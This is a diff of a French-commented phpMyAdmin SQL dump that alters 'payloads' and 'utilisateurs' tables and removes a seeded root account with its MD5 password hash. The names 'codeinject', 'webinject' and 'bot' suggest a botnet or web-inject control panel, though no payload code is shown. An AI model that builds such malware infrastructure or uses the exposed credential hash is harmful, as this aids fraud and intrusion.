@@ -3,7 +3,7 @@
 -- http://www.phpmyadmin.net
 --
 -- Client :  localhost:8889
--- Généré le :  Mar 12 Avril 2016 à 17:52
+-- Généré le :  Mer 13 Avril 2016 à 18:00
 -- Version du serveur :  5.5.42
 -- Version de PHP :  7.0.0
 
@@ -126,8 +126,9 @@ CREATE TABLE `payloads` (
   `id` int(11) NOT NULL,
   `name` text NOT NULL,
   `urlverif` text NOT NULL,
-  `codeinject` text NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+  `codeinject` text NOT NULL,
+  `action` int(11) NOT NULL DEFAULT '0'
+) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
 
@@ -140,14 +141,7 @@ CREATE TABLE `utilisateurs` (
   `username` text NOT NULL,
   `password` varchar(255) NOT NULL,
   `bot` int(11) NOT NULL DEFAULT '0'
-) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
-
---
--- Contenu de la table `utilisateurs`
---
-
-INSERT INTO `utilisateurs` (`id`, `username`, `password`, `bot`) VALUES
-(1, 'root', '7b24afc8bc80e548d66c4e7ff72171c5', 0);
+) ENGINE=InnoDB DEFAULT CHARSET=latin1;
 
 -- --------------------------------------------------------
 
@@ -269,12 +263,12 @@ ALTER TABLE `logs_checker`
 -- AUTO_INCREMENT pour la table `payloads`
 --
 ALTER TABLE `payloads`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=4;
 --
 -- AUTO_INCREMENT pour la table `utilisateurs`
 --
 ALTER TABLE `utilisateurs`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
+  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 --
 -- AUTO_INCREMENT pour la table `webinject`
 --
